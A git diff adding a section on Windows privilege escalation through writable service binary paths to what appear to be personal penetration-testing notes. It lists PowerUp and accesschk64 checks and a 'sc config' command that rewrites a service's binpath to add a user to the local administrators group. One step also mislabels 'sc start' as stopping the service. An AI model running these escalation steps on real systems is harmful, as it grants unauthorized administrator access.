@@ -307,6 +307,19 @@ In the file we will see a way to compile it ---> x86_64-w64-mingw32-gcc windows_
 After we got our dll file we want to put in into the windows machine and put it in the path that is writable by us.
 After we need to use the command ---> sc stop dllsvc and after start the service to use the dll file that we've created.
 ```
+# Escalation Via Binary Paths
+```
+We can use the powerup tool with the command ---> powershell -ep bypass and . .\powerup.ps1 and Invoke-AllChecks (We will need to look at the Checking service permissions).
+We can use a another method and run the tool accesschk64.exe with the command ---> accesschk64.exe -uwcv Everyone * (-u dont show errors, -w only show objects with write 
+access, -c display service names, -v verbose , Everyone to see where everyone as a group can write. 
+To see the whole settings with accesschk64.exe we can run the command ---> accesschk64.exe -wuvc $service_name and we will look for SERVICE_CHANGE_CONFIG status.
+After running the accesschk64.exe or the powerup.ps1 tool we can see the service name that we can abouse.
+We need to query the service with the command ---> sc qc $service_name, we will see the path that we can work with.
+Because we have the status of SERVICE_CHANGE_CONFIG we can modify the service configuration with the command ---> sc config $service_name binpath= "net localgroup administrators user /add".
+We need to query the service with the command ---> sc qc $service_name we need to see that the BINARY_PATH_NAME is changed to "net localgroup administrators user /add".
+Now lets stop the service with the command ---> sc start $service_name.
+
+```
 # rdesktop connection 
 ```
 rdesktop $IP -g 95% 
